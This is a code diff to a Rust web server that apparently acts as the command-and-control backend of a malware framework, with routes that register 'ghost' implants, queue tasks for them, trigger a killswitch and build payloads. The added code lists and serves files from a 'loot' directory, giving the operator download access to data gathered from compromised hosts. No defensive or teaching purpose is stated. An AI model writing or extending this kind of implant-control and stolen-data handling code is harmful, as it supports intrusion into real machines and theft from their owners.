@@ -319,6 +319,20 @@ async fn handle_charon_kill_ghost(
     state.pending_tasks.entry(id).or_insert_with(Vec::new).push(kill_task);
 }
 
+async fn handle_charon_list_loot(State(_state): State<Arc<ServerState>>) -> Json<Vec<String>> {
+    let mut files = Vec::new();
+
+    if let Ok(mut entries) = tokio::fs::read_dir("loot").await {
+        while let Ok(Some(entry)) = entries.next_entry().await {
+            if let Ok(file_name) = entry.file_name().into_string() {
+                files.push(file_name);
+            }
+        }
+    }
+
+    Json(files)
+}
+
 // BUILDER
 async fn handle_charon_build(
     State(_state): State<Arc<ServerState>>,
@@ -420,6 +434,7 @@ async fn handle_charon_build(
 pub fn app(state: Arc<ServerState>) -> Router {
     let build_base = std::env::var("SHADOW_BUILD_DIR").unwrap_or("builds".to_string());
     let serve_dir = ServeDir::new(build_base);
+    let serve_loot = ServeDir::new("loot");
 
     let ghost_routes = Router::<Arc<ServerState>>::new()
         .route("/register", post(handle_ghost_register))        // ghost init (register)
@@ -434,7 +449,9 @@ pub fn app(state: Arc<ServerState>) -> Router {
         .route("/ghosts/{id}/tasks", get(handle_charon_get_ghost_tasks))    // get all tasks for GHOST
         .route("/tasks/{id}", get(handle_charon_get_task_details))      // get single task details
         .route("/ghosts/{id}/kill", post(handle_charon_kill_ghost))    // killswitch for GHOST
-        .route("/build", post(handle_charon_build));
+        .route("/build", post(handle_charon_build))
+        .route("/loot", get(handle_charon_list_loot))
+        .nest_service("/loot/download", serve_loot);
 
     // init router with route -> handler mapping
     Router::<Arc<ServerState>>::new()
